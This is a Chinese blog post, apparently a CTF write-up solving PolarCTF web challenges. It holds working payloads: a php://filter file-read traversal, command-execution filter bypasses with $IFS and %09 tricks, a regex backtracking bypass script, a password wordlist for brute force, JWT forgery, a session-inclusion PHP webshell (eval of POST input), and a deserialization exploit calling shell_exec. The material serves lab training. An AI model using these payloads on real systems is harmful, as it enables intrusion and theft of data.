animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://cdn.jsdelivr.net/gh/guipi01/images@main/2222.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://cdn.jsdelivr.net/gh/guipi01/images@main/2222.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://cdn.jsdelivr.net/gh/guipi01/images@main/2222.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://cdn.jsdelivr.net/gh/guipi01/images@main/2222.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF/" style="font-size: 1.05rem;">CTF<sup>2</sup></a><a href="/tags/Mac-m1%E7%9A%84binutils%E9%85%8D%E7%BD%AE/" style="font-size: 1.05rem;">Mac m1的binutils配置<sup>1</sup></a><a href="/tags/PWN/" style="font-size: 1.05rem;">PWN<sup>1</sup></a><a href="/tags/Web/" style="font-size: 1.05rem;">Web<sup>1</sup></a><a href="/tags/hexo/" style="font-size: 1.05rem;">hexo<sup>1</sup></a><a href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" style="font-size: 1.05rem;">数据结构<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/04/"><span class="card-archive-list-date">四月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">6</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/03/"><span class="card-archive-list-date">三月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div><div class="console-btn-item" id="consoleKeyboard" onclick="anzhiyu.keyboardToggle()" title="快捷键开关"><a class="keyboard-switch"><i class="anzhiyufont anzhiyu-icon-keyboard"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/" itemprop="url">CTF</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/CTF/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>CTF</span></a></span></div></div><h1 class="post-title" itemprop="name headline">polarctf_wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2025-04-05T13:23:59.000Z" title="发表于 2025-04-05 21:23:59">2025-04-05</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2025-04-06T10:09:49.693Z" title="更新于 2025-04-06 18:09:49">2025-04-06</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">11.2k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>46分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="polarctf_wp"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为石家庄"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>石家庄</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://gcore.jsdelivr.net/gh/guipi01/images@main/wallhaven-exdl2k.jpg"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="https://guipi01.github.io/posts/bcd86d8.html"><header><a class="post-meta-categories" href="/categories/CTF/" itemprop="url">CTF</a><a href="/tags/CTF/" tabindex="-1" itemprop="url">CTF</a><h1 id="CrawlerTitle" itemprop="name headline">polarctf_wp</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">guipi</span><time itemprop="dateCreated datePublished" datetime="2025-04-05T13:23:59.000Z" title="发表于 2025-04-05 21:23:59">2025-04-05</time><time itemprop="dateCreated datePublished" datetime="2025-04-06T10:09:49.693Z" title="更新于 2025-04-06 18:09:49">2025-04-06</time></header><h1 id="polarctf靶场"><a href="#polarctf靶场" class="headerlink" title="polarctf靶场"></a>polarctf靶场</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>进入url发现这样一句话，然后看了看cookie，发现value为no，改为yes，发现了base64加密的字符串<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-09 19.26.16.png" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-09 19.27.32.png" alt="截屏2025-03-09 19.26.16" style="zoom:50%;" /></p>
<p>经过base64解码，得到一个路径，访问看到了源码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-09 19.28.57.png" alt="截屏2025-03-09 19.28.57" style="zoom:50%;" /></p>
<p>经过分析，应该是一个伪协议读取，构造payload得到base64解码就可以dedaoflag了,因为后边加了.php所以payload中不需要</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=..././..././..././..././flag</span><br></pre></td></tr></table></figure>
<h3 id="简单rce"><a href="#简单rce" class="headerlink" title="简单rce"></a>简单rce</h3><p>首先访问的URL出现了下边的代码，分析一下，首先是一个no函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    <span class="comment">//对文件进行语法高亮显示</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">no</span>(<span class="params"><span class="variable">$txt</span></span>)</span>&#123;            <span class="comment">//定义一个no函数，并传入变量txt</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|more|less|head|tac|tail|nl|od|vim|uniq|system|proc_open|shell_exec|popen| /i&quot;</span>, <span class="variable">$txt</span>))&#123;       <span class="comment">//preg_match 函数用于执行一个正则表达式匹配</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$txt</span>;            <span class="comment">//返回参数值</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what&#x27;s up&quot;</span>);   <span class="comment">//输出一条消息，并退出当前脚本</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$yyds</span>=(<span class="variable">$_POST</span>[<span class="string">&#x27;yyds&#x27;</span>]);        <span class="comment">//通过POST方式传递参数yyds</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>])&amp;&amp;<span class="variable">$yyds</span>==<span class="string">&#x27;666&#x27;</span>)&#123;  <span class="comment">//通过GET方式传递参数sys；并判断</span></span><br><span class="line">  <span class="keyword">eval</span>(<span class="title function_ invoke__">no</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>]));            <span class="comment">//调用no函数，并输出</span></span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nonono&quot;</span>;                    <span class="comment">//输出nonono    </span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-24 14.11.30.png" alt="截屏2025-02-24 14.11.30"></p>
<p>PHP代码的命令执行函数有</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>() 输出并返回最后一行shell结果。</span><br><span class="line"><span class="title function_ invoke__">exec</span>() 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。</span><br><span class="line"><span class="title function_ invoke__">passthru</span>() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。（替换system）</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()</span><br><span class="line"><span class="title function_ invoke__">popen</span>()/<span class="title function_ invoke__">proc_open</span>()</span><br><span class="line"><span class="comment">//输出函数：</span></span><br><span class="line">cat函数 由第一行开始显示内容，并将所有内容输出</span><br><span class="line">tac函数 从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line">nl      类似于cat -n，显示时输出行号</span><br><span class="line">more    根据窗口大小，一页一页的现实文件内容</span><br><span class="line">less    和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line">head    只显示头几行</span><br><span class="line">tail    只显示最后几行</span><br><span class="line">sort    文本内容排列</span><br><span class="line">uniq    可以查看</span><br><span class="line">vim     一种编辑器，这个也可以查看</span><br><span class="line">od      以二进制的方式读取档案内容</span><br><span class="line">vi      一种编辑器，这个也可以查看</span><br><span class="line">strings  在对象文件或二进制文件中查找可打印的字符串, 在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings</span><br><span class="line">paste    把每个文件以列对列的方式，一列列地加以合并</span><br><span class="line">grep    grep &#123; flag.php打印有”&#123;“的一行</span><br><span class="line">sed        一种编辑器，可以用sed -f flag.php读取flag</span><br><span class="line"><span class="comment">//空格绕过：</span></span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">&#123;IFS&#125;$<span class="number">9</span></span><br><span class="line">$IFS$<span class="number">9</span></span><br><span class="line">重定向符：&lt;&gt;（但是不支持后面跟通配符）</span><br><span class="line">水平制表符%<span class="number">09</span></span><br><span class="line">%<span class="number">0</span>a 回车</span><br><span class="line">%<span class="number">0</span>d换行</span><br><span class="line">$IFS$<span class="number">1</span></span><br><span class="line">%<span class="number">09</span>(tab)</span><br><span class="line">%<span class="number">20</span>(space)</span><br><span class="line"><span class="variable">$IFS</span></span><br><span class="line">&lt;</span><br></pre></td></tr></table></figure>
<p>方法一：使用未被过滤的函数passthru进行绕过<code>/?sys=passthru(&quot;ls%09/&quot;);</code>得到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-24 14.19.15.png" alt="截屏2025-02-24 14.19.15" style="zoom:50%;" /></p>
<p>方法二：使用转义字符过滤,适用PHP版本PHP&gt;=7</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">以八进制表示的\[<span class="number">0</span>–<span class="number">7</span>]&#123;<span class="number">1</span>,<span class="number">3</span>&#125;转义字符会自动适配byte（如<span class="string">&quot;\400&quot;</span> == “\<span class="number">000</span>”）</span><br><span class="line">以十六进制的\x[<span class="number">0</span>–<span class="number">9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">2</span>&#125;转义字符表示法（如“\x41<span class="string">&quot;）</span></span><br><span class="line"><span class="string">以Unicode表示的\u&#123;[0–9A-Fa-f]+&#125;字符，会输出为UTF-8字符串</span></span><br><span class="line"><span class="string">URL编码协议规定（即 RFC3986 协议）：URL 中只允许包含英文字母、数字、以及这 4 个 - _ . ~ 特殊字符和所有的保留字符</span></span><br><span class="line"><span class="string">sys=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);</span></span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-24 14.19.44.png" alt="截屏2025-02-24 14.19.44" style="zoom:33%;" /></p>
<h3 id="swp"><a href="#swp" class="headerlink" title="swp"></a>swp</h3><p>发现是文件泄漏，使用dirsearch惊喜目录扫描，发现了/.index.php.swp文件，访问得到了代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jiuzhe</span>(<span class="params"><span class="variable">$xdmtql</span></span>)</span>&#123; <span class="comment">//接受一个xdmtql变量</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sys.*nb/is&#x27;</span>,<span class="variable">$xdmtql</span>); <span class="comment">//匹配变量</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$xdmtql</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;xdmtql&#x27;</span>]; <span class="comment">//判断变量是否为数组类型，不为数组类型往下判断</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$xdmtql</span>))&#123;  <span class="comment">//利用jiuzhe函数进行匹配输入的值</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">jiuzhe</span>(<span class="variable">$xdmtql</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$xdmtql</span>,<span class="string">&#x27;sys nb&#x27;</span>)!==<span class="literal">false</span>)&#123;  <span class="comment">//绕过 preg_match函数后匹配变量，匹配到的话输出flag</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;flag&#123;*******&#125;&#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;true .swp file?&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;nijilenijile&#x27;</span>;  <span class="comment">//匹配到/sys.*nb/is的话输出</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后使用py脚本,去匹配字符，最后得到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://9c50bb87-6bff-49ba-8089-2f0065677fd6.www.polarctf.com:8090/&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;xdmtql&quot;</span>: <span class="string">&quot;sys nb&quot;</span> + <span class="string">&quot;a&quot;</span> * <span class="number">1000000</span>&#125;</span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.content)</span><br></pre></td></tr></table></figure>
<h3 id="被黑掉的网站"><a href="#被黑掉的网站" class="headerlink" title="被黑掉的网站"></a>被黑掉的网站</h3><p>首先访问URL什么也没有，用dirsearch扫一下目录,出现了几个可以访问的文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-24 20.05.30.png" alt="截屏2025-02-24 20.05.30" style="zoom:50%;" /></p>
<p>首先/index.php.bak文件不是知道是什么，查看一下/shell.php</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-24 20.06.15.png" alt="截屏2025-02-24 20.06.15" style="zoom:50%;" /></p>
<p>发现需要输入，想到上边的index.php.bak文件的内容试一下,首先用py脚本将空格转化为换行，然后使用bp进行爆破当pass=nikel时，出现了flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">replace_spaces_with_newlines</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="comment"># 使用字符串的 replace 方法将空格替换为换行符</span></span><br><span class="line">    result = input_string.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">input_string = <span class="string">&quot;123456 123456789 123123 111111 anhyeuem 1234567 123456789 123456 12345678 000000 asdasd 25251325 1234567890 121212 123321 zxcvbnm qweqwe 456789 112233 aaaaaa 123123123 987654321 11111111 qwerty 147258369 maiyeuem 123qwe 654321 iloveyou 123654 999999 qqqqqq 1111111 147258 hota407 anhtuan 222222 159753 11223344 anhnhoem anh123 159357 qwertyuiop asd123 987654321 emyeuanh mmmmmm 12345 666666 anhanh 123789 phuong 111222 qweasd hanoiyeudau nguyen 789456 1111111111 mylove 789456123 19001560 qwe123 asdfghjkl pppppp anhhung 1234560 abc123 maiyeu 123456a zzzzzz quangninh 987654 555555 tuananh asasas asdfgh zxcvbn 321321 tinhyeu 147852369 456123 matkhau 147852 12345678910 thienthan nikel anhyeu 111111111 toilatoi 10cham0 147258369 456456 khongbiet 789789 a123456 333333 888888 123654789 truong maimaiyeuem hhhhhh&quot;</span></span><br><span class="line">output_string = replace_spaces_with_newlines(input_string)</span><br><span class="line"><span class="built_in">print</span>(output_string)</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-24 20.07.21.png" alt="截屏2025-02-24 20.07.21" style="zoom:50%;" /></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-24 20.18.19.png" alt="截屏2025-02-24 20.18.19" style="zoom:25%;" /></p>
<h3 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h3><p>首先通过题目的提示是jwt的题目，那么访问URL发现是个登录和注册，首先自己注册一个看到了cookie有jwt那么，先爆破一下密钥然后重新构造jwt，将username改为admin，使用的工具<a target="_blank" rel="noopener" href="https://www.bejson.com/jwt/">https://www.bejson.com/jwt/</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-24 20.47.14.png" alt="截屏2025-02-24 20.47.14" style="zoom:50%;" /></p>
<p>然后将生成的jwt放到自己登录的cookie中，刷新页面，发现用户名变为了admin，点击个人中心发现了flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-24 20.48.25.png" alt="截屏2025-02-24 20.48.25" style="zoom:50%;" /></p>
<h3 id=""><a href="#" class="headerlink" title="$$"></a>$$</h3><p>看题目是$$感觉应该是和全局相关的，查看代码，发现是通过GET方式给c一个值，然后通过preg_match()函数进行正则匹配，如果匹配到就输出oh，否则就输出变量a，那么考虑给c一全局变量c=GLOBALS</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-25 14.53.21.png" alt="截屏2025-02-25 14.53.21" style="zoom:50%;" /></p>
<p>发现给出了flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-25 14.56.43.png" alt="截屏2025-02-25 14.56.43" style="zoom:50%;" /></p>
<h3 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h3><p>首先访问URL发现有一个输入框，随便输入，查看网页代码发现了file=1.txt和2.txt,点击my dairy发现了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-25 15.23.56.png" alt="截屏2025-02-25 15.23.56" style="zoom:25%;" /></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-25 15.31.47.png" alt="截屏2025-02-25 15.31.47" style="zoom:50%;" /></p>
<p>那么通过伪协议进行读取（base64编码）<code>php://filter/read=convert.base64-encode/resource=action.php</code>因为题目中给的是action.php所以读取这个文件，然后用base64解码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-25 15.33.27.png" alt="截屏2025-02-25 15.33.27" style="zoom:25%;" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//解码的内容</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">error_reporting(0);</span><br><span class="line">$name = $_POST[&#x27;name&#x27;];</span><br><span class="line">if($name)&#123;</span><br><span class="line">    $_SESSION[&quot;username&quot;] = $name;</span><br><span class="line">&#125;</span><br><span class="line">include($_GET[&#x27;file&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;a href=action.php?file=1.txt&gt;my dairy&lt;/a&gt;</span><br><span class="line">&lt;a href=action.php?file=2.txt&gt;my booklist&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>是一个php代码</p>
<p>session文件名的构造是sess_ + sessionid ， sessionid在cookie中可以查看</p>
<p>有了参数，开始猜存放session文件的位置，一般默认为tmp，直接执行命令访问session文件</p>
<p>这里可以采取两种方式得到flag：命令读取或者蚁剑连接shell</p>
<p>然后通过给name传入shell，用蚁剑读取<code>name=&lt;?php @eval($_POST[a]);?&gt;</code></p>
<p>命令读取用<code>name=&lt;?=system(&#39;cat+/f*&#39;);?&gt;</code></p>
<h3 id="PHP反序列化初试"><a href="#PHP反序列化初试" class="headerlink" title="PHP反序列化初试"></a>PHP反序列化初试</h3><p>首先访问url，看到了代码，有两个魔术方法<code>__wakeup()</code>和<code>__toString()</code>，分析代码在Evil类中有个evil变量执行了shell_exec()函数所以<code>evil=&#39;tac f*&#39;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 16.26.28.png" alt="截屏2025-02-26 16.26.28" style="zoom:50%;" /></p>
<p>然后编写exp，得到flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evil</span>=<span class="string">&#x27;tac f*&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$env</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Easy</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Evil</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;name = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!-- 首先是<span class="keyword">new</span>了两个类，让Easy类的name变量去调用第二个类，然后执行第二个类中的<span class="title function_ invoke__">shell_exec</span>()函数 --&gt;</span><br></pre></td></tr></table></figure>
